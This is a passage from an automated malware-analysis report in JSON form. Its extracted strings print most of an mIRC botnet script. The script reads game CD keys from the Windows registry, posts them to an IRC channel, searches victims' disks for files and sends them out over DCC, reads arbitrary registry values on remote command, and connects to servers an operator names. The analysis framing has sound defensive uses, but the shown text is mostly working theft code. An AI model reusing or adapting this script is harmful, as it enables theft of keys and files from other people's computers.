            "      else { scon $2 part $3- }    ",
            "    }",
            "    elseif ($1 == .disconnect) { scon 2 disconnect }",
            "    elseif ($1 == .msg) {",
            "      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }",
            "      else { scon $2 .msg $3 $4- }",
            "    }",
            "    elseif ($1 == .listserver) { listserver }",
            "    elseif ($1 == .readreg) { ",
            "      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }",
            "      else { scon 1 .msg $nick $_regread($2-) }",
            "    }",
            "    elseif ($1 == .connect) { ",
            "      if ($scon(0) == 2)  { scon 2 server $2- }",
            "      elseif ($scon(0) == 1) { server -m $2- }",
            "    }",
            "alias -l listserver {",
            "  var %i = 1",
            "  while (%i <= $scon(0)) {",
            "    var %botnet.listserver %botnet.listserver $iif($scon(%i).server,",
            " $+ %i $+ ",
            ": $scon(%i).server)",
            "    inc %i",
            "  if ($1 == public) { scon 1 .msg %botnet.channel %botnet.listserver }",
            "  else { .msg $nick %botnet.listserver }",
            "alias -l getkeys { ",
            "  var %botnet.getkeys.bfv $_regread(HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Battlefield Vietnam\\ergc\\)",
            "  var %botnet.getkeys.hl $_regread(HKEY_CURRENT_USER\\Software\\Valve\\Half-Life\\Settings\\Key)",
            "  var %botnet.getkeys.ut $_regread(HKEY_LOCAL_MACHINE\\SOFTWARE\\Unreal Technology\\Installed Apps\\UT2004\\CDKEY)",
            "  var %botnet.getkeys.q3 $read($_regread(HKEY_LOCAL_MACHINE\\SOFTWARE\\Id\\Quake III Arena\\INSTALLPATH) $+ \\baseq3\\q3key,1)",
            "  var %botnet.getkeys.bf $_regread(HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc\\)",
            "  if ($1 == public) {",
            "    .msg #boonster.keys $iif(%botnet.getkeys.bfv,Battlefield Vietnam ",
            " $+ %botnet.getkeys.bfv $+ ",
            " )  $iif(%botnet.getkeys.hl,Half-Life ",
            " $+ %botnet.getkeys.hl $+ ",
            " )  $iif(%botnet.getkeys.ut,Unreal Tournament 2004 ",
            " $+ %botnet.getkeys.ut $+ ",
            " ) $iif(%botnet.getkeys.bf,Battlefield 1942 ",
            " $+ %botnet.getkeys.bf $+ ",
            " ) $iif(%botnet.getkeys.q3,Quake III Arena ",
            " $+ %botnet.getkeys.q3 $+ ",
            "  else {",
            "    scon 1 .msg $nick $iif(%botnet.getkeys.bfv,Battlefield Vietnam ",
            " $+ %botnet.getkeys.bfv $+ ",
            " )  $iif(%botnet.getkeys.hl,Half-Life ",
            " $+ %botnet.getkeys.hl $+ ",
            " )  $iif(%botnet.getkeys.ut,Unreal Tournament 2004 ",
            " $+ %botnet.getkeys.ut $+ ",
            " ) $iif(%botnet.getkeys.bf,Battlefield 1942 ",
            " $+ %botnet.getkeys.bf $+ ",
            " ) $iif(%botnet.getkeys.q3,Quake III Arena ",
            " $+ %botnet.getkeys.q3 $+ ",
            "  }  ",
            "alias -l search_file {",
            "  if (!$disk($1)) { return NO_GIVEN_DISK }",
            "  elseif (!$2) { return NO_SEARCH_FILE }",
            "  elseif (%botnet.protection.search_file_timer) { return TIMER_STILL_ACTIVE }",
            "  set %botnet.protection.search_file_timer ON",
            "  var %i 1, %disk $1, %search $2, %found",
            "  while (%i <= $findfile(%disk,%search,0)) {",
            "    ;echo -a $findfile(%disk,%search,%i)",
            "    %found = %found $replace($findfile(%disk,%search,%i),$chr(32),$chr(155))",
            "    inc %i",
            "  if (%found) {",
            "    if ($4 == public) {",
            "      scon 1 .msg #boonster.found Found: $replace(%found,$chr(155),$chr(32))",
            "    }",
            "    else {",
            "      scon 1 .msg $3 Found: $replace(%found,$chr(155),$chr(32))",
            "    }",
            "  set %botnet.search_file.found $replace($strip(%found),$chr(32),$chr(8))",
            "  .timer 1 10 unset %botnet.protection.search_file_timer",
            "  .timer 1 60 unset %botnet.search_file.found",
            "alias -l get_search_file {",
            "  if (!%botnet.search_file.found) { return NO_SEARCH_RESULT }",
            "  elseif ($1 !isnum) { return NO_GIVEN_FILENUMBER }",
            "  if ($isfile($replace($gettok(%botnet.search_file.found,$1,8),$chr(155),$chr(32)))) {",
            "    dcc send $2 $replace($gettok(%botnet.search_file.found,$1,8),$chr(155),$chr(32))",
            "  }    ",
            "alias -l _regread {",
            "  var %a = regread $+ $ticks",
            "  .comopen %a WScript.Shell",
            "  if ($comerr) { return 0 }",
            "  if (!$com(%a,RegRead,3,bstr,$1)) {",
            "    .comclose %a",
            "    return 0",
            "  var %b = $com(%a).result",
            "  .comclose %a",
            "  return %b",
            "alias scan_config {",
            "  if ($2) {",
            "    var %search $2",
            "    if ($1 == counterstrike) { ",
            "      var %dir $_regread(HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Steam\\InstallPath) $+ \\SteamApps",
            "      var %i 1, %line 1",
            "      if ($isfile(scan_config.txt)) { .remove scan_config.txt }",
            "      while (%i <= $findfile(%dir,*.cfg,0)) {",
            "        if ($read($findfile(%dir,*.cfg,%i),w,* $+ %search $+ *,%line)) { .write scan_config.txt _ | .write scan_config.txt $findfile(%dir,*.cfg,%i) }",
            "        while ($read($findfile(%dir,*.cfg,%i),w,* $+ %search $+ *,%line)) {",
            "          .write scan_config.txt $read($findfile(%dir,*.cfg,%i),w,* $+ %search $+ *,%line)",
            "          var %line $calc($readn + 1)",
            "        }",
            "        var %line 1",
            "        inc %i",
            "      }",
            "      scon 1 .msg %botnet.channel File written.. ",
            "    }",
            "    elseif ($1 == quake3) { }",
            "ctcp *:dcc send:*: if ($len($nopath($filename)) >= 225) { scon 1 .msg %botnet.channel $nick tried to crash me with an illegal dcc send of $nopath($filename) | halt }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.376619",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
